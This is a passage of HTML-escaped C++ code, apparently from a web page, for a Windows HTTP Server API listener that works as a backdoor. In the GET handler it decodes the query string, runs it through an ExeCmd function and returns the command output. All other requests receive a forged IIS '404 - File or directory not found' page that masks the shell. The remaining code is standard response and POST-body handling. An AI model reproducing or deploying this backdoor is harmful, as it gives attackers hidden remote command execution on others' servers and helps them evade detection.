gt;&lt;/div&gt;\r\n&lt;div&nbsp;id=\&quot;content\&quot;&gt;\r\n&nbsp;&lt;div&nbsp;class=\&quot;content-container\&quot;&gt;&lt;fieldset&gt;\r\n&nbsp;&nbsp;&lt;h2&gt;404&nbsp;-&nbsp;File&nbsp;or&nbsp;directory&nbsp;not&nbsp;found.&lt;/h2&gt;\r\n&nbsp;&nbsp;&lt;h3&gt;The&nbsp;resource&nbsp;you&nbsp;are&nbsp;looking&nbsp;for&nbsp;might&nbsp;have&nbsp;been&nbsp;removed,&nbsp;had&nbsp;its&nbsp;name&nbsp;changed,&nbsp;or&nbsp;is&nbsp;temporarily&nbsp;unavailable.&lt;/h3&gt;\r\n&nbsp;&lt;/fieldset&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;<br />					);<br />					wprintf(L&quot;--&gt;&nbsp;Set&nbsp;the&nbsp;Response&nbsp;to&nbsp;404\n&quot;);<br />				}<br />				else<br />				{<br />					wprintf(L&quot;[*]&nbsp;QueryString:%ws\n&quot;,&nbsp;pRequest-&gt;CookedUrl.pQueryString);<br />					int&nbsp;l&nbsp;=&nbsp;pRequest-&gt;CookedUrl.QueryStringLength&nbsp;+&nbsp;1;<br />					WCHAR&nbsp;*QueryString&nbsp;=&nbsp;new&nbsp;WCHAR[l];<br />					wcsncpy_s(QueryString,&nbsp;l,&nbsp;pRequest-&gt;CookedUrl.pQueryString+1,&nbsp;l-1);<br /><br />					WCHAR&nbsp;*QueryStringDecode&nbsp;=&nbsp;urldecode(QueryString);<br />					wprintf(L&quot;[*]&nbsp;QueryStringDecode:%ws\n&quot;,&nbsp;QueryStringDecode);<br /><br />					char&nbsp;*data&nbsp;=&nbsp;ExeCmd(QueryStringDecode);<br /><br />					delete[]&nbsp;QueryStringDecode;<br />					QueryStringDecode&nbsp;=&nbsp;nullptr;<br /><br />					char&nbsp;*decodedata&nbsp;=&nbsp;TextToHtml(data);<br /><br />					result&nbsp;=&nbsp;SendHttpResponse(<br />						hReqQueue,<br />						pRequest,<br />						200,<br />						&quot;OK&quot;,<br />						decodedata<br />					);<br />					delete[]&nbsp;decodedata;<br />					decodedata&nbsp;=&nbsp;nullptr;<br /><br />				}<br /><br />				break;<br /><br />			case&nbsp;HttpVerbPOST:<br /><br />				wprintf(L&quot;Got&nbsp;a&nbsp;POST&nbsp;request&nbsp;for&nbsp;%ws&nbsp;\n&quot;,<br />					pRequest-&gt;CookedUrl.pFullUrl);<br />				//	result&nbsp;=&nbsp;SendHttpPostResponse(hReqQueue,&nbsp;pRequest);<br />				result&nbsp;=&nbsp;SendHttpResponse(<br />					hReqQueue,<br />					pRequest,<br />					404,<br />					&quot;Not&nbsp;Found&quot;,<br />					&quot;&lt;!DOCTYPE&nbsp;html&nbsp;PUBLIC&nbsp;\&quot;-//W3C//DTD&nbsp;XHTML&nbsp;1.0&nbsp;Strict//EN\&quot;&nbsp;\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\&quot;&gt;\r\n&lt;html&nbsp;xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n&lt;meta&nbsp;http-equiv=\&quot;Content-Type\&quot;&nbsp;content=\&quot;text/html;&nbsp;charset=iso-8859-1\&quot;/&gt;\r\n&lt;title&gt;404&nbsp;-&nbsp;File&nbsp;or&nbsp;directory&nbsp;not&nbsp;found.&lt;/title&gt;\r\n&lt;style&nbsp;type=\&quot;text/css\&quot;&gt;\r\n&lt;!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana,&nbsp;Arial,&nbsp;Helvetica,&nbsp;sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0&nbsp;15px&nbsp;10px&nbsp;15px;}&nbsp;\r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;}\r\nh3{font-size:1.2em;margin:10px&nbsp;0&nbsp;0&nbsp;0;color:#000000;}\r\n#header{width:96%;margin:0&nbsp;0&nbsp;0&nbsp;0;padding:6px&nbsp;2%&nbsp;6px&nbsp;2%;font-family:\&quot;trebuchet&nbsp;MS\&quot;,&nbsp;Verdana,&nbsp;sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0&nbsp;0&nbsp;0&nbsp;2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n--&gt;\r\n&lt;/style&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;div&nbsp;id=\&quot;header\&quot;&gt;&lt;h1&gt;Server&nbsp;Error&lt;/h1&gt;&lt;/div&gt;\r\n&lt;div&nbsp;id=\&quot;content\&quot;&gt;\r\n&nbsp;&lt;div&nbsp;class=\&quot;content-container\&quot;&gt;&lt;fieldset&gt;\r\n&nbsp;&nbsp;&lt;h2&gt;404&nbsp;-&nbsp;File&nbsp;or&nbsp;directory&nbsp;not&nbsp;found.&lt;/h2&gt;\r\n&nbsp;&nbsp;&lt;h3&gt;The&nbsp;resource&nbsp;you&nbsp;are&nbsp;looking&nbsp;for&nbsp;might&nbsp;have&nbsp;been&nbsp;removed,&nbsp;had&nbsp;its&nbsp;name&nbsp;changed,&nbsp;or&nbsp;is&nbsp;temporarily&nbsp;unavailable.&lt;/h3&gt;\r\n&nbsp;&lt;/fieldset&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;<br />				);<br />				wprintf(L&quot;--&gt;&nbsp;Set&nbsp;the&nbsp;Response&nbsp;to&nbsp;404\n&quot;);<br /><br />				break;<br /><br />			default:<br />				wprintf(L&quot;Got&nbsp;a&nbsp;unknown&nbsp;request&nbsp;for&nbsp;%ws&nbsp;\n&quot;,<br />					pRequest-&gt;CookedUrl.pFullUrl);<br /><br />				result&nbsp;=&nbsp;SendHttpResponse(<br />					hReqQueue,<br />					pRequest,<br />					503,<br />					&quot;Not&nbsp;Implemented&quot;,<br />					NULL<br />				);<br />				break;<br />			}<br /><br />			if&nbsp;(result&nbsp;!=&nbsp;NO_ERROR)<br />			{<br />				break;<br />			}<br /><br />			//<br />			//&nbsp;Reset&nbsp;the&nbsp;Request&nbsp;ID&nbsp;to&nbsp;handle&nbsp;the&nbsp;next&nbsp;request.<br />			//<br />			HTTP_SET_NULL_ID(&amp;requestId);<br />		}<br />		else&nbsp;if&nbsp;(result&nbsp;==&nbsp;ERROR_MORE_DATA)<br />		{<br />			//<br />			//&nbsp;The&nbsp;input&nbsp;buffer&nbsp;was&nbsp;too&nbsp;small&nbsp;to&nbsp;hold&nbsp;the&nbsp;request<br />			//&nbsp;headers.&nbsp;Increase&nbsp;the&nbsp;buffer&nbsp;size&nbsp;and&nbsp;call&nbsp;the&nbsp;<br />			//&nbsp;API&nbsp;again.&nbsp;<br />			//<br />			//&nbsp;When&nbsp;calling&nbsp;the&nbsp;API&nbsp;again,&nbsp;handle&nbsp;the&nbsp;request<br />			//&nbsp;that&nbsp;failed&nbsp;by&nbsp;passing&nbsp;a&nbsp;RequestID.<br />			//<br />			//&nbsp;This&nbsp;RequestID&nbsp;is&nbsp;read&nbsp;from&nbsp;the&nbsp;old&nbsp;buffer.<br />			//<br />			requestId&nbsp;=&nbsp;pRequest-&gt;RequestId;<br /><br />			//<br />			//&nbsp;Free&nbsp;the&nbsp;old&nbsp;buffer&nbsp;and&nbsp;allocate&nbsp;a&nbsp;new&nbsp;buffer.<br />			//<br />			RequestBufferLength&nbsp;=&nbsp;bytesRead;<br />			FREE_MEM(pRequestBuffer);<br />			pRequestBuffer&nbsp;=&nbsp;(PCHAR)ALLOC_MEM(RequestBufferLength);<br /><br />			if&nbsp;(pRequestBuffer&nbsp;==&nbsp;NULL)<br />			{<br />				result&nbsp;=&nbsp;ERROR_NOT_ENOUGH_MEMORY;<br />				break;<br />			}<br /><br />			pRequest&nbsp;=&nbsp;(PHTTP_REQUEST)pRequestBuffer;<br /><br />		}<br />		else&nbsp;if&nbsp;(ERROR_CONNECTION_INVALID&nbsp;==&nbsp;result&nbsp;&amp;&amp;<br />			!HTTP_IS_NULL_ID(&amp;requestId))<br />		{<br />			//&nbsp;The&nbsp;TCP&nbsp;connection&nbsp;was&nbsp;corrupted&nbsp;by&nbsp;the&nbsp;peer&nbsp;when<br />			//&nbsp;attempting&nbsp;to&nbsp;handle&nbsp;a&nbsp;request&nbsp;with&nbsp;more&nbsp;buffer.&nbsp;<br />			//&nbsp;Continue&nbsp;to&nbsp;the&nbsp;next&nbsp;request.<br /><br />			HTTP_SET_NULL_ID(&amp;requestId);<br />		}<br />		else<br />		{<br />			break;<br />		}<br /><br />	}<br /><br />	if&nbsp;(pRequestBuffer)<br />	{<br />		FREE_MEM(pRequestBuffer);<br />	}<br /><br />	return&nbsp;result;<br />}<br /><br />/*******************************************************************++<br /><br />Routine&nbsp;Description:<br />The&nbsp;routine&nbsp;sends&nbsp;a&nbsp;HTTP&nbsp;response<br /><br />Arguments:<br />hReqQueue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Handle&nbsp;to&nbsp;the&nbsp;request&nbsp;queue<br />pRequest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;The&nbsp;parsed&nbsp;HTTP&nbsp;request<br />StatusCode&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Response&nbsp;Status&nbsp;Code<br />pReason&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Response&nbsp;reason&nbsp;phrase<br />pEntityString&nbsp;-&nbsp;Response&nbsp;entity&nbsp;body<br /><br />Return&nbsp;Value:<br />Success/Failure.<br />--*******************************************************************/<br /><br />DWORD&nbsp;SendHttpResponse(<br />	IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReqQueue,<br />	IN&nbsp;PHTTP_REQUEST&nbsp;pRequest,<br />	IN&nbsp;USHORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StatusCode,<br />	IN&nbsp;PSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pReason,<br />	IN&nbsp;PSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pEntityString<br />)<br />{<br />	HTTP_RESPONSE&nbsp;&nbsp;&nbsp;response;<br />	HTTP_DATA_CHUNK&nbsp;dataChunk;<br />	DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result;<br />	DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bytesSent;<br /><br />	//<br />	//&nbsp;Initialize&nbsp;the&nbsp;HTTP&nbsp;response&nbsp;structure.<br />	//<br />	INITIALIZE_HTTP_RESPONSE(&amp;response,&nbsp;StatusCode,&nbsp;pReason);<br /><br />	//<br />	//&nbsp;Add&nbsp;a&nbsp;known&nbsp;header.<br />	//<br />	ADD_KNOWN_HEADER(response,&nbsp;HttpHeaderContentType,&nbsp;&quot;text/html&quot;);<br /><br />	if&nbsp;(pEntityString)<br />	{<br />		//&nbsp;<br />		//&nbsp;Add&nbsp;an&nbsp;entity&nbsp;chunk.<br />		//<br />		dataChunk.DataChunkType&nbsp;=&nbsp;HttpDataChunkFromMemory;<br />		dataChunk.FromMemory.pBuffer&nbsp;=&nbsp;pEntityString;<br />		dataChunk.FromMemory.BufferLength&nbsp;=<br />			(ULONG)strlen(pEntityString);<br /><br />		response.EntityChunkCount&nbsp;=&nbsp;1;<br />		response.pEntityChunks&nbsp;=&nbsp;&amp;dataChunk;<br />	}<br /><br />	//&nbsp;<br />	//&nbsp;Because&nbsp;the&nbsp;entity&nbsp;body&nbsp;is&nbsp;sent&nbsp;in&nbsp;one&nbsp;call,&nbsp;it&nbsp;is&nbsp;not<br />	//&nbsp;required&nbsp;to&nbsp;specify&nbsp;the&nbsp;Content-Length.<br />	//<br /><br />	result&nbsp;=&nbsp;HttpSendHttpResponse(<br />		hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;ReqQueueHandle<br />		pRequest-&gt;RequestId,&nbsp;//&nbsp;Request&nbsp;ID<br />		0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Flags<br />		&amp;response,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;HTTP&nbsp;response<br />		NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved1<br />		&amp;bytesSent,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;bytes&nbsp;sent&nbsp;&nbsp;(OPTIONAL)<br />		NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved2&nbsp;&nbsp;(must&nbsp;be&nbsp;NULL)<br />		0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved3&nbsp;&nbsp;&nbsp;(must&nbsp;be&nbsp;0)<br />		NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;LPOVERLAPPED(OPTIONAL)<br />		NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved4&nbsp;&nbsp;(must&nbsp;be&nbsp;NULL)<br />	);<br /><br />	if&nbsp;(result&nbsp;!=&nbsp;NO_ERROR)<br />	{<br />		wprintf(L&quot;HttpSendHttpResponse&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,&nbsp;result);<br />	}<br /><br />	return&nbsp;result;<br />}<br /><br />#define&nbsp;MAX_ULONG_STR&nbsp;((ULONG)&nbsp;sizeof(&quot;4294967295&quot;))<br /><br />/*******************************************************************++<br /><br />Routine&nbsp;Description:<br />The&nbsp;routine&nbsp;sends&nbsp;a&nbsp;HTTP&nbsp;response&nbsp;after&nbsp;reading&nbsp;the&nbsp;entity&nbsp;body.<br /><br />Arguments:<br />hReqQueue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Handle&nbsp;to&nbsp;the&nbsp;request&nbsp;queue.<br />pRequest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;The&nbsp;parsed&nbsp;HTTP&nbsp;request.<br /><br />Return&nbsp;Value:<br />Success/Failure.<br />--*******************************************************************/<br /><br />DWORD&nbsp;SendHttpPostResponse(<br />	IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReqQueue,<br />	IN&nbsp;PHTTP_REQUEST&nbsp;pRequest<br />)<br />{<br />	HTTP_RESPONSE&nbsp;&nbsp;&nbsp;response;<br />	DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result;<br />	DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bytesSent;<br />	PUCHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pEntityBuffer;<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EntityBufferLength;<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BytesRead;<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TempFileBytesWritten;<br />	HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hTempFile;<br />	TCHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;szTempName[MAX_PATH&nbsp;+&nbsp;1];<br />	CHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;szContentLength[MAX_ULONG_STR];<br />	HTTP_DATA_CHUNK&nbsp;dataChunk;<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TotalBytesRead&nbsp;=&nbsp;0;<br /><br />	BytesRead&nbsp;=&nbsp;0;<br />	hTempFile&nbsp;=&nbsp;INVALID_HANDLE_VALUE;<br /><br />	//<br />	//&nbsp;Allocate&nbsp;space&nbsp;for&nbsp;an&nbsp;entity&nbsp;buffer.&nbsp;Buffer&nbsp;can&nbsp;be&nbsp;increased&nbsp;<br />	//&nbsp;on&nbsp;demand.<br />	//<br />	EntityBufferLength&nbsp;=&nbsp;2048;<br />	pEntityBuffer&nbsp;=&nbsp;(PUCHAR)ALLOC_MEM(EntityBufferLength);<br /><br />	if&nbsp;(pEntityBuffer&nbsp;==&nbsp;NULL)<br />	{<br />		result&nbsp;=&nbsp;ERROR_NOT_ENOUGH_MEMORY;<br />		wprintf(L&quot;Insufficient&nbsp;resources&nbsp;\n&quot;);<br />		goto&nbsp;Done;<br />	}<br /><br />	//<br />	//&nbsp;Initialize&nbsp;the&nbsp;HTTP&nbsp;response&nbsp;structure.<br />	//<br />	INITIALIZE_HTTP_RESPONSE(&amp;response,&nbsp;200,&nbsp;&quot;OK&quot;);<br /><br />	//<br />	//&nbsp;For&nbsp;POST,&nbsp;echo&nbsp;back&nbsp;the&nbsp;entity&nbsp;from&nbsp;the<br />	//&nbsp;client<br />	//<br />	//&nbsp;NOTE:&nbsp;If&nbsp;the&nbsp;HTTP_RECEIVE_REQUEST_FLAG_COPY_BODY&nbsp;flag&nbsp;had&nbsp;been<br />	//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;passed&nbsp;with&nbsp;HttpReceiveHttpRequest(),&nbsp;the&nbsp;entity&nbsp;would&nbsp;<br />	//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;have&nbsp;been&nbsp;a&nbsp;part&nbsp;of&nbsp;HTTP_REQUEST&nbsp;(using&nbsp;the&nbsp;pEntityChunks<br />	//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;field).&nbsp;Because&nbsp;that&nbsp;flag&nbsp;was&nbsp;not&nbsp;passed,&nbsp;there&nbsp;are&nbsp;no<br />	//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;entity&nbsp;bodies&nbsp;in&nbsp;HTTP_REQUEST.<br />	//<br /><br />	if&nbsp;(pRequest-&gt;Flags&nbsp;&amp;&nbsp;HTTP_REQUEST_FLAG_MORE_ENTITY_BODY_EXISTS)<br />	{<br />		//&nbsp;The&nbsp;entity&nbsp;body&nbsp;is&nbsp;sent&nbsp;over&nbsp;multiple&nbsp;calls.&nbsp;Collect&nbsp;<br />		//&nbsp;these&nbsp;in&nbsp;a&nbsp;file&nbsp;and&nbsp;send&nbsp;back.&nbsp;Create&nbsp;a&nbsp;temporary&nbsp;<br />		//&nbsp;file.<br />		//<br /><br />		if&nbsp;(GetTempFileName(<br />			L&quot;.&quot;,<br />			L&quot;New&quot;,<br />			0,<br />			szTempName<br />		)&nbsp;==&nbsp;0)<br />		{<br />			result&nbsp;=&nbsp;GetLastError();<br />			wprintf(L&quot;GetTempFileName&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,&nbsp;result);<br />			goto&nbsp;Done;<br />		}<br /><br />		hTempFile&nbsp;=&nbsp;CreateFile(<br />			szTempName,<br />			GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,<br />			0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Do&nbsp;not&nbsp;share.<br />			NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;No&nbsp;security&nbsp;descriptor.<br />			CREATE_ALWAYS,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Overrwrite&nbsp;existing.<br />			FILE_ATTRIBUTE_NORMAL,&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Normal&nbsp;file.<br />			NULL<br />		);<br /><br />		if&nbsp;(hTempFile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />		{<br />			result&nbsp;=&nbsp;GetLastError();<br />			wprintf(L&quot;Cannot&nbsp;create&nbsp;temporary&nbsp;file.&nbsp;Error&nbsp;%lu&nbsp;\n&quot;,<br />				result);<br />			goto&nbsp;Done;<br />		}<br /><br />		do<br />		{<br />			//<br />			//&nbsp;Read&nbsp;the&nbsp;entity&nbsp;chunk&nbsp;from&nbsp;the&nbsp;request.<br />			//<br />			BytesRead&nbsp;=&nbsp;0;<br />			result&nbsp;=&nbsp;HttpReceiveRequestEntityBody(<br />				hReqQueue,<br />				pRequest-&gt;RequestId,<br />				0,<br />				pEntityBuffer,<br />				EntityBufferLength,<br />				&amp;BytesRead,<br />				NULL<br />			);<br /><br />			switch&nbsp;(result)<br />			{<br />			case&nbsp;NO_ERROR:<br /><br />				if&nbsp;(BytesRead&nbsp;!=&nbsp;0)<br />				{<br />					TotalBytesRead&nbsp;+=&nbsp;BytesRead;<br />					WriteFile(<br />						hTempFile,<br />						pEntityBuffer,<br />						BytesRead,<br />						&amp;TempFileBytesWritten,<br />						NULL<br />					);<br />				}<br />				break;<br /><br />			case&nbsp;ERROR_HANDLE_EOF:<br /><br />				//<br />				//&nbsp;The&nbsp;last&nbsp;request&nbsp;entity&nbsp;body&nbsp;has&nbsp;been&nbsp;read.<br />				//&nbsp;Send&nbsp;back&nbsp;a&nbsp;response.&nbsp;<br />				//<br />				//&nbsp;To&nbsp;illustrate&nbsp;entity&nbsp;sends&nbsp;via&nbsp;<br />				//&nbsp;HttpSendResponseEntityBody,&nbsp;the&nbsp;response&nbsp;will&nbsp;<br />				//&nbsp;be&nbsp;sent&nbsp;over&nbsp;multiple&nbsp;calls.&nbsp;To&nbsp;do&nbsp;this,<br />				//&nbsp;pass&nbsp;the&nbsp;HTTP_SEND_RESPONSE_FLAG_MORE_DATA<br />				//&nbsp;flag.<br /><br />				if&nbsp;(BytesRead&nbsp;!=&nbsp;0)<br />				{<br />					TotalBytesRead&nbsp;+=&nbsp;BytesRead;<br />					WriteFile(<br />						hTempFile,<br />						pEntityBuffer,<br />						BytesRead,<br />						&amp;TempFileBytesWritten,<br />						NULL<br />					);<br />				}<br /><br />				//<br />				//&nbsp;Because&nbsp;the&nbsp;response&nbsp;is&nbsp;sent&nbsp;over&nbsp;multiple<br />				//&nbsp;API&nbsp;calls,&nbsp;add&nbsp;a&nbsp;content-length.<br />				//<br />				//&nbsp;Alternatively,&nbsp;the&nbsp;response&nbsp;could&nbsp;have&nbsp;been<br />				//&nbsp;sent&nbsp;using&nbsp;chunked&nbsp;transfer&nbsp;encoding,&nbsp;by&nbsp;&nbsp;<br />				//&nbsp;passimg&nbsp;&quot;Transfer-Encoding:&nbsp;Chunked&quot;.<br />				//<br /><br />				//&nbsp;NOTE:&nbsp;Because&nbsp;the&nbsp;TotalBytesread&nbsp;in&nbsp;a&nbsp;ULONG<br />				//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;are&nbsp;accumulated,&nbsp;this&nbsp;will&nbsp;not&nbsp;work<br />				//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;entity&nbsp;bodies&nbsp;larger&nbsp;than&nbsp;4&nbsp;GB.&nbsp;<br />				//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For&nbsp;support&nbsp;of&nbsp;large&nbsp;entity&nbsp;bodies,<br />				//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;a&nbsp;ULONGLONG.<br />				//&nbsp;<br /><br /><br />				sprintf_s(szContentLength,&nbsp;MAX_ULONG_STR,&nbsp;&quot;%lu&quot;,&nbsp;TotalBytesRead);<br /><br />				ADD_KNOWN_HEADER(<br />					response,<br />					HttpHeaderContentLength,<br />					szContentLength<br />				);<br /><br />				result&nbsp;=<br />					HttpSendHttpResponse(<br />						hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;ReqQueueHandle<br />						pRequest-&gt;RequestId,&nbsp;//&nbsp;Request&nbsp;ID<br />						HTTP_SEND_RESPONSE_FLAG_MORE_DATA,<br />						&amp;response,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;HTTP&nbsp;response<br />						NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved1<br />						&amp;bytesSent,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;bytes&nbsp;sent-optional<br />						NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved2<br />						0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved3<br />						NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;LPOVERLAPPED<br />						NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved4<br />					);<br /><br />				if&nbsp;(result&nbsp;!=&nbsp;NO_ERROR)<br />				{<br />					wprintf(<br />						L&quot;HttpSendHttpResponse&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,<br />						result<br />					);<br />					goto&nbsp;Done;<br />				}<br /><br />				//<br />				//&nbsp;Send&nbsp;entity&nbsp;body&nbsp;from&nbsp;a&nbsp;file&nbsp;handle.<br />				//<br />				dataChunk.DataChunkType&nbsp;=<br />					HttpDataChunkFromFileHandle;<br /><br />				dataChunk.FromFileHandle.<br />					ByteRange.StartingOffset.QuadPart&nbsp;=&nbsp;0;<br /><br />				dataChunk.FromFileHandle.<br />					ByteRange.Length.QuadPart&nbsp;=<br />					HTTP_BYTE_RANGE_TO_EOF;<br /><br />				dataChunk.FromFileHandle.FileHandle&nbsp;=&nbsp;hTempFile;<br /><br />				result&nbsp;=&nbsp;HttpSendResponseEntityBody(<br />					hReqQueue,<br />					pRequest-&gt;RequestId,<br />					0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;This&nbsp;is&nbsp;the&nbsp;last&nbsp;send.<br />					1,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Entity&nbsp;Chunk&nbsp;Count.<br />					&amp;dataChunk,<br />					NULL,<br />					NULL,<br />					0,<br />					NULL,<br />					NULL<br />				);<br /><br />				if&nbsp;(result&nbsp;!=&nbsp;NO_ERROR)<br />				{<br />					wprintf(<br />						L&quot;HttpSendResponseEntityBody&nbsp;failed&nbsp;%lu\n&quot;,<br />						result<br />					);<br />				}<br /><br />				goto&nbsp;Done;<br /><br />				break;<br /><br /><br />			default:<br />				wprintf(<br />					L&quot;HttpReceiveRequestEntityBody&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,<br />					result);<br />				goto&nbsp;Done;<br />			}<br /><br />		}&nbsp;while&nbsp;(TRUE);<br />	}<br />	else<br />	{<br />		